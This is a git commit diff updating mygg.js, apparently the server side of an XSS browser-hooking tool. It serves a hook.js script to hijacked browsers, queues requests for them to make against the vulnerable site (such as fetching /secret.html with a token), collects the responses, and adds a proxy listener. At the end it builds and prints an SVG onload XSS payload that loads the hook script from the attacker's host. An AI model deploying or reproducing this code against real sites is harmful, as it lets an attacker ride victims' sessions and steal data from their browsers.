e395d86b2ddb2909f871ce67941499253659a017
Daniel Solstad <solstad.daniel@gmail.com>
2019-08-20 20:10:02 +0200

    Update mygg.js

--- mygg.js
+++ mygg.js
@@ -1,12 +1,26 @@
-var https = require('https');
-var fs = require('fs');
+const https = require('https');
+const http = require('http');
+const fs = require('fs');
 
-var options = {
-    mygg_host: 'https://127.0.0.1',
+/* 
+### Config
+*/
+
+const config = {
+    web_host: '127.0.0.1',
+    web_port: 443,
     key: fs.readFileSync('server.key'),
-    cert: fs.readFileSync('server.crt')
-};
+    cert: fs.readFileSync('server.crt'),
+    proxy_ip: '127.0.0.1',
+    proxy_port: 8081,
+    proxy_allowed_ips: ['127.0.0.1'],
+}
 
+/* 
+task_pending structure:
+var tasks_pending = [{"id": 1, "method": "GET", "url": "/secret.html", "head": {"Token": "key"}, "body": null},
+                     {"id": 2, "method": "POST", "url": "/secret2.html", "head": {"Content-Type": "application/json"}, "body": '{"test":"asdf"}'}]
+*/
 var tasks_pending = [{"id": 1, "method": "GET", "url": "/secret.html", "head": {"Token": "key"}, "body": null},
                      {"id": 2, "method": "GET", "url": "/secret2.html", "head": {"Token": "key"}, "body": null},
                      {"id": 3, "method": "POST", "url": "/secret2.html", "head": {"Content-Type": "application/json"}, "body": '{"test":"asdf"}'},
@@ -14,13 +28,52 @@ var tasks_pending = [{"id": 1, "method": "GET", "url": "/secret.html", "head": {
                     ]
 var tasks_completed = [];
 
-/* The payload that downloads mygg */
-hook = '<svg/onload="x=document.createElement(\'script\');'
-hook = hook + 'x.src="' + options.mygg_host + '/hook.js";document.head.appendChild(x);">'
-console.log("[+] Payload:\r\n" + hook + "\r\n")
 
-/* The web server communicating with the hooked browser */
-https.createServer(options, function (req, res) {
+/* 
+### The proxy server that communicates with mygg 
+*/
+
+const proxy_options = {
+    key: config.key,
+    cert: config.cert
+};
+
+const proxy_server = http.createServer(proxy_options, function (req, res) {
+    res.writeHead(405, {'Content-Type': 'text/plain'})
+    res.end('Method not allowed')
+    
+})
+
+proxy_server.on('connect', function (req, client_socket, head) {
+    console.log(client_socket.remoteAddress, client_socket.remotePort, req.method, req.url, req.headers)
+    client_socket.write([
+      'HTTP/1.1 200 Connection Established',
+      'Proxy-agent: Node-VPN',
+    ].join('\r\n'))
+    client_socket.end('\r\n\r\n')
+});
+
+const listener = proxy_server.listen(config.proxy_port, function (err) {
+    if (err) {
+      return console.error(err)
+    }
+    const info = listener.address()
+    console.log(`[+] Proxy server is listening on address ${info.address} port ${info.port}`)
+})
+    
+
+
+
+
+/* 
+### The web server communicating with the hooked browser.
+### Used to serve hook.js and receive/answering polling requests.
+*/
+const https_options = {
+    key: config.key,
+    cert: config.cert
+};
+https.createServer(https_options, function (req, res) {
     /* Serves the hook file */
     if (req.url == '/hook.js') {
         fs.readFile('./hook.js', function (err, data) {
@@ -45,7 +98,6 @@ https.createServer(options, function (req, res) {
         }
     /* Catching the pre-flight request from the hooked browser */
     } else if (req.url == '/responses' && req.method == 'OPTIONS') {
-        //console.log("GOT PREFLIGHT")
         res.setHeader('Access-Control-Allow-Origin', '*')
         res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
         res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
@@ -73,4 +125,18 @@ https.createServer(options, function (req, res) {
         res.writeHead(404);
         res.end();
     }
-}).listen(443);
+}).listen(config.web_port, function (err) {
+    if (err) {
+        return console.error(err)
+    }
+    var info = this.address()
+    console.log(`[+] mygg server is listening on address ${info.address} port ${info.port}`)
+});
+
+/* 
+### The payload that downloads mygg 
+*/
+var hook = '<svg/onload="x=document.createElement(\'script\');'
+var hook = hook + 'x.src="//' + config.web_host + '/hook.js";document.head.appendChild(x);">'
+console.log("[+] Payload:\r\n" + hook + "\r\n")
+
